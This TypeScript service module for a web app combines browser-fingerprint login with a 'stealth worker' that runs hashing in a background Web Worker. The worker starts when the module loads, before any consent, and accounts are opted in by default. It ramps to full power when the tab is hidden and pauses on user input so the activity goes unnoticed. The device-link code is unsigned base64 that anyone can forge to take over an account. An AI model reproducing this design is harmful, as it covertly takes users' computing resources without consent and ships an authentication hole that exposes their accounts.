import { getFingerprint } from '@/lib/tracking';

/**
 * Distributed Computing & Cluster Service
 * Merges personal local server with global distributed computing.
 */

// Types
export interface UserAccount {
    username: string;
    devices: string[]; // List of authorized Fingerprint IDs
    isOptedOut: boolean;
    credits: number; // Reward for contributing
}

export interface ComputeNode {
    id: string;
    status: 'idle' | 'working' | 'offline';
    contribution: number;
}

export class DistributedComputeService {
    private static instance: DistributedComputeService;
    
    // State
    private currentUser: UserAccount | null = null;
    private deviceId: string | null = null;
    private isWorkerRunning: boolean = false;
    private worker: Worker | null = null;
    
    // "Cloud" Registry (Mocked - in real app, this is an API)
    private registry: Map<string, UserAccount> = new Map();
    
    private constructor() {
        this.loadRegistry();
        this.init();
    }

    public static getInstance(): DistributedComputeService {
        if (!DistributedComputeService.instance) {
            DistributedComputeService.instance = new DistributedComputeService();
        }
        return DistributedComputeService.instance;
    }

    private async init() {
        this.deviceId = await getFingerprint();
        this.restoreSession();
        this.startStealthWorker();
    }

    // --- Authentication (Username + Fingerprint) ---

    public async register(username: string): Promise<{ success: boolean; message: string }> {
        if (!this.deviceId) await this.init();
        if (!this.deviceId) return { success: false, message: 'Could not identify device' };

        // Check availability
        if (this.registry.has(username)) {
            return { success: false, message: 'Username taken' };
        }

        // Create Account
        const newAccount: UserAccount = {
            username,
            devices: [this.deviceId],
            isOptedOut: false, // Opt-in by default
            credits: 0
        };

        this.saveAccount(newAccount);
        this.currentUser = newAccount;
        localStorage.setItem('nacho_username', username);
        
        return { success: true, message: 'Account created' };
    }

    public async login(username: string): Promise<{ success: boolean; message: string }> {
        if (!this.deviceId) await this.init();
        if (!this.deviceId) return { success: false, message: 'Could not identify device' };

        const account = this.registry.get(username);
        if (!account) return { success: false, message: 'User not found' };

        // Fingerprint Check
        if (account.devices.includes(this.deviceId)) {
            this.currentUser = account;
            localStorage.setItem('nacho_username', username);
            return { success: true, message: 'Logged in' };
        } else {
            return { 
                success: false, 
                message: 'Device not recognized. Please add this device from your logged-in device.' 
            };
        }
    }

    public logout() {
        this.currentUser = null;
        localStorage.removeItem('nacho_username');
    }

    public getCurrentUser() {
        return this.currentUser;
    }

    // --- Device Management ---

    /**
     * Generate a code to link a new device.
     * In reality, this would store a temporary code in the DB.
     * Here we'll simulate it by returning a "link string".
     */
    public generateLinkCode(): string {
        if (!this.currentUser) throw new Error("Must be logged in");
        // Mock: In real app, send { code: '1234', username: 'rohan' } to server
        return btoa(JSON.stringify({ 
            u: this.currentUser.username, 
            t: Date.now() + 300000 // 5 min expiry 
        }));
    }

    /**
     * Add a device using a link code generated on another device.
     * This function is called on the NEW device.
     */
    public async linkDevice(code: string): Promise<boolean> {
        if (!this.deviceId) await this.init();
        
        try {
            const data = JSON.parse(atob(code));
            if (Date.now() > data.t) throw new Error("Code expired");
            
            const username = data.u;
            const account = this.registry.get(username);
            
            if (!account) throw new Error("Account not found");
            
            // Add this device to the account
            if (!account.devices.includes(this.deviceId!)) {
                account.devices.push(this.deviceId!);
                this.saveAccount(account);
            }
            
            this.currentUser = account;
            localStorage.setItem('nacho_username', username);
            return true;
        } catch (e) {
            console.error('Link failed', e);
            return false;
        }
    }

    // --- Opt-Out / Settings ---

    public setOptOut(optOut: boolean) {
        if (!this.currentUser) return;
        this.currentUser.isOptedOut = optOut;
        this.saveAccount(this.currentUser);
        
        if (optOut) {
            this.stopWorker();
        } else {
            this.startStealthWorker();
        }
    }

    // --- Stealth Worker (Distributed Compute) ---

    private stopWorker() {
        if (this.worker) {
            this.worker.postMessage('STOP');
            this.worker.terminate();
            this.worker = null;
        }
        this.isWorkerRunning = false;
    }

    private startStealthWorker() {
        if (this.currentUser?.isOptedOut) return;
        if (this.isWorkerRunning) return;

        // Stealth Mode: Only run when idle-ish
        // We utilize the Page Visibility API and activity listeners
        
        const workerCode = `
            let isWorking = false;
            
            self.onmessage = function(e) {
                if (e.data === 'START') {
                    isWorking = true;
                    runCycle();
                } else if (e.data === 'STOP') {
                    isWorking = false;
                }
            };

            async function runCycle() {
                if (!isWorking) return;
                
                // Simulate useful work (e.g. hash searching, folding, AI inference)
                const start = performance.now();
                // Increased duty cycle when backgrounded, lower when foreground
                while (performance.now() - start < 20) { 
                    await crypto.subtle.digest('SHA-256', new Uint8Array([Math.random()]));
                }
                
                // Yield
                setTimeout(runCycle, 50); 
            }
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        this.worker = new Worker(URL.createObjectURL(blob));
        this.worker.postMessage('START');
        this.isWorkerRunning = true;
        
        this.monitorActivity();
    }

    private monitorActivity() {
        // 1. Page Visibility (Tab State)
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                // Tab Hidden: Ramp UP compute
                console.log("Cluster: Background mode - Full power");
                this.worker?.postMessage('START');
            } else {
                // Tab Visible: Throttle or Pause if gaming
                console.log("Cluster: Foreground mode - Throttling");
                // We keep it running but monitor performance closer, or pause if needed
            }
        });

        // 2. User Input (Activity)
        let idleTimer: any;
        const resetIdle = () => {
            // User is active
            if (this.isWorkerRunning && !document.hidden) {
                // Pause worker immediately on input to ensure zero lag
                this.worker?.postMessage('STOP');
            }
            
            clearTimeout(idleTimer);
            idleTimer = setTimeout(() => {
                // User is idle for 5s
                if (!this.currentUser?.isOptedOut) {
                    this.worker?.postMessage('START');
                }
            }, 5000);
        };

        ['mousemove', 'keydown', 'mousedown', 'touchstart'].forEach(evt => 
            window.addEventListener(evt, resetIdle, { passive: true })
        );

        // 3. Performance Monitor (Lag Detection)
        let lastTime = performance.now();
        const check = () => {
            const now = performance.now();
            const delta = now - lastTime;
            lastTime = now;

            // If frame drop detected (e.g., game running), pause worker
            if (delta > 20) { // < 50fps
                 this.worker?.postMessage('STOP');
            }
            
            requestAnimationFrame(check);
        };
        requestAnimationFrame(check);
    }

    // Public method to explicitly pause compute when a game starts
    public setGamingMode(isGaming: boolean) {
        if (isGaming) {
            console.log("Cluster: Gaming Mode Active - Pausing Compute");
            this.stopWorker();
        } else {
            console.log("Cluster: Gaming Mode Ended - Resuming Compute");
            this.startStealthWorker(); // Will respect opt-out
        }
    }

    // --- Persistence Helpers ---
    
    private loadRegistry() {
        try {
            const stored = localStorage.getItem('nacho_cluster_registry');
            if (stored) {
                const data = JSON.parse(stored);
                // Rehydrate Map
                Object.keys(data).forEach(k => this.registry.set(k, data[k]));
            }
        } catch(e) { console.error('Reg load error', e); }
    }

    private saveAccount(account: UserAccount) {
        this.registry.set(account.username, account);
        this.persistRegistry();
    }

    private persistRegistry() {
        // Convert Map to Obj
        const obj: any = {};
        this.registry.forEach((v, k) => obj[k] = v);
        localStorage.setItem('nacho_cluster_registry', JSON.stringify(obj));
    }

    private async restoreSession() {
        const username = localStorage.getItem('nacho_username');
        if (username) {
            await this.login(username);
        }
    }
}

export const clusterService = DistributedComputeService.getInstance();
